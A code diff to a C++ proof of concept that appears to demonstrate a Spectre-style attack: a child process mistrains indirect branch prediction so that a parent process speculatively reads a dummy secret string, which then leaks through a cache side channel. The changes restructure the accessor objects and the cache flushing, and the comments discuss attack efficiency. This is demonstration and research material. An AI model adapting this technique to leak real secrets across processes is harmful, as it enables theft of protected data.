@@ -40,11 +40,14 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
+#include "utils.h"
 
 const char *public_data = "xxxxxxxxxxxxxxxx";
 const char *private_data = "It's a s3kr3t!!!";
+
+// Empirically tested to have a good performance. 2048 is slower, but increasing
+// the number further does not help.
 constexpr size_t kAccessorArrayLength = 4096;
-constexpr size_t kCacheLineSize = 64;
 
 // Used in pointer-arithmetics and control-flow. On the child (attacker) it is
 // 0, on the parent (victim) it is non-zero (it stores the pid of the child).
@@ -72,29 +75,20 @@ class PublicDataAccessor : public DataAccessor {
   char GetDataByte(size_t index) override { return public_data[index]; }
 };
 
-// Public data accessor. Used by the victim (parent). Leaks only public data.
-auto public_data_accessor =
-    std::unique_ptr<DataAccessor>(new PublicDataAccessor);
-
-// Private data accessor. Used by the attacker (child). Leaks private data.
-auto private_data_accessor =
-    std::unique_ptr<DataAccessor>(new PrivateDataAccessor);
-
-// On the victim (parent) it leaks data that is physically located at
-// private_data[offset], without ever loading it. In the abstract machine, and
-// in the code executed by the CPU, this function does not load any memory
-// except for what is in the bounds of `public_data`, and local auxiliary data.
-//
-// Instead, the leak is performed by indirect branch prediction during
-// speculative execution, the attacker (child) mistraining the predictor to
-// jump to the address of GetDataByte implemented by PrivateDataAccessor that
-// reads private data instead of public data.
 static char LeakByte(size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
   auto array_of_pointers =
       std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
           new std::array<DataAccessor *, kAccessorArrayLength>());
+
+  // Public data accessor. Used by the victim (parent). Leaks only public data.
+  auto public_data_accessor =
+      std::unique_ptr<DataAccessor>(new PublicDataAccessor);
+
+  // Private data accessor. Used by the attacker (child). Leaks private data.
+  auto private_data_accessor =
+      std::unique_ptr<DataAccessor>(new PrivateDataAccessor);
 
   for (int run = 0;; ++run) {
     // Only the parent needs to flush the oracle.
@@ -110,6 +104,8 @@ static char LeakByte(size_t offset) {
       //                    ? public_data_accesor.get();
       // Parent (victim) uses public_data_accessor, child (attacker) uses
       // private_data_accessor.
+      // We are copying the data in here, because copying them outside of the
+      // loop decreases the attack efficiency.
       pointer = private_data_accessor.get() + static_cast<bool>(pid) * (
           public_data_accessor.get() - private_data_accessor.get());
     }
@@ -120,7 +116,11 @@ static char LeakByte(size_t offset) {
       // We make sure to flush whole accessor object in case it is
       // hypothetically on multiple cache-lines.
       const char *accessor_bytes = reinterpret_cast<const char *>(accessor);
-      FlushFromCache(accessor_bytes, accessor_bytes + sizeof(DataAccessor));
+
+      // Only the parent needs to flush the accessor.
+      if (pid != 0) {
+        FlushFromCache(accessor_bytes, accessor_bytes + sizeof(DataAccessor));
+      }
 
       // Speculative fetch at the offset. Architecturally the victim fetches
       // always from the public_data, though speculatively it fetches the
